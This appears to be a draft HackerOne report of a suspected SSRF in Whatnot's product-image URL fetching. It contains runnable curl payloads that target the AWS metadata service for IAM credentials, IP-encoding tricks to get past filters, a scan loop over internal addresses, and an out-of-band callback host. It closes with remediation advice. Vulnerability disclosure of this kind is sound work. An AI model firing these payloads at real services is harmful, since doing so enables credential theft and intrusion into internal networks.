# HackerOne Submission — SSRF via Product Image URL Fetch

**Program:** Whatnot  
**Weakness:** Server-Side Request Forgery (SSRF)  
**Severity:** High  
**Asset:** api.whatnot.com / whatnot.com  

---

## Summary

Whatnot allows sellers to provide image URLs for product listings — the platform fetches these images server-side to display them in listings. This server-side URL fetch is a classic SSRF vector. If the server does not validate the URL scheme and destination IP, an attacker can make Whatnot's backend servers send HTTP requests to internal AWS metadata endpoints (169.254.169.254), internal services on RFC1918 ranges, or other internal infrastructure — potentially leaking AWS IAM credentials, internal service details, or enabling access to internal APIs.

---

## Background

From Whatnot's Help Center (confirmed public):
> "Image URLs must be publicly accessible via https:// with no password protection. Up to 8 image URLs can be included per product."

The platform fetches these URLs server-side to validate and cache images. This is a textbook SSRF surface.

---

## Steps to Reproduce

### Step 1 — Set up an SSRF callback server

Use an out-of-band interaction server to detect blind SSRF:

```bash
# Option 1: Use Burp Collaborator (if you have Burp Pro)
# Your collaborator URL: https://YOUR-ID.burpcollaborator.net/

# Option 2: Use interactsh (open source)
interactsh-client  # generates URL like: https://abcdef.oast.fun
```

---

### Step 2 — Submit product listing with SSRF payload as image URL

Using the Seller API or the web interface, create a product listing with a malicious image URL:

**Via GraphQL Seller API:**
```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation CreateProduct($input: CreateProductInput!) { createProduct(input: $input) { product { id images { url } } } }",
    "variables": {
      "input": {
        "title": "Test SSRF Product",
        "description": "Test",
        "price": 1.00,
        "images": [
          { "url": "https://YOUR-ID.oast.fun/ssrf-probe" }
        ]
      }
    }
  }'
```

---

### Step 3 — Check for interaction on callback server

If Whatnot's server fetches the URL, you will receive a DNS lookup and/or HTTP request at your callback server. This confirms blind SSRF.

Check `interactsh-client` output for:
```
[INF] DNS interaction from: X.X.X.X (whatnot's server IP)
[INF] HTTP interaction: GET /ssrf-probe HTTP/1.1
      Host: YOUR-ID.oast.fun
      User-Agent: ...
```

---

### Step 4 — Escalate to AWS metadata service

If SSRF is confirmed, attempt to read AWS IAM credentials:

```bash
# Payload 1: Direct metadata URL
SSRF_PAYLOAD="http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Payload 2: IPv6 encoded (bypass naive filters)
SSRF_PAYLOAD="http://[::ffff:169.254.169.254]/latest/meta-data/"

# Payload 3: Decimal IP encoding
SSRF_PAYLOAD="http://2852039166/latest/meta-data/"  # 169.254.169.254 in decimal

# Payload 4: Octal
SSRF_PAYLOAD="http://0251.0376.0251.0376/latest/meta-data/"

# Submit each as a product image URL
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{
    \"query\": \"mutation { createProduct(input: { title: \\\"Test\\\", price: 1.00, images: [{ url: \\\"${SSRF_PAYLOAD}\\\" }] }) { product { images { url } } } }\"
  }"
```

**Check response** — if the AWS metadata service responds, its content may appear in an error message or in the image URL field of the response.

---

### Step 5 — Target internal services

```bash
# Common internal service ports on AWS ECS/EC2
for target in \
  "http://localhost:8080/" \
  "http://localhost:8443/" \
  "http://localhost:4000/" \
  "http://172.17.0.1:4000/" \
  "http://10.0.0.1/" \
  "http://192.168.1.1/" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"; do
  
  echo "=== Testing: ${target} ==="
  curl -s -X POST https://api.whatnot.com/seller-api/graphql \
    -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"mutation { createProduct(input: { title: \\\"t\\\", price: 1.00, images: [{ url: \\\"${target}\\\" }] }) { product { id } } }\"}" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(str(d)[:200])"
done
```

---

### Step 6 — Test profile picture SSRF

Also test the user avatar/profile picture upload if it accepts URLs:

```bash
curl -s -X POST https://api.whatnot.com/seller-api/graphql \
  -H "Authorization: Bearer wn_access_tk_YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateUser(input: { profileImageUrl: \"http://169.254.169.254/latest/meta-data/\" }) { user { profileImage } } }"
  }'
```

---

## Expected Result

URL validation should reject non-HTTPS URLs and block private IP ranges:
```json
{"errors": [{"message": "Invalid image URL. Must be a public HTTPS URL."}]}
```

## Actual Result (if vulnerable)

Server fetches the URL, either returning content in the response or triggering an out-of-band DNS/HTTP interaction at the callback server.

---

## Impact

| Escalation Level | Impact |
|---|---|
| Blind SSRF confirmed | Internal network port scanning, service fingerprinting |
| AWS metadata accessible | EC2 IAM role credentials leaked — full AWS account access possible |
| Internal API accessible | Bypass authentication on internal admin APIs |
| IMDSv2 not enforced | One-request metadata fetch (no session token required) |

If AWS IMDSv2 is not enforced and SSRF reaches `169.254.169.254`:
```
GET /latest/meta-data/iam/security-credentials/whatnot-role
→ { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }
```
These credentials grant access to all AWS resources the EC2 role can access — potentially including S3 buckets with user data, RDS databases, and more.

---

## Recommended Fix

- Validate all user-supplied URLs against an allowlist of trusted CDN domains before fetching
- Block fetches to RFC1918 ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) and link-local (169.254.0.0/16) at the HTTP client level
- Use IMDSv2 (require session-oriented metadata access) to mitigate metadata SSRF impact
- Process image fetching in an isolated network namespace with no access to internal services
- Reference: [PortSwigger SSRF](https://portswigger.net/web-security/ssrf)
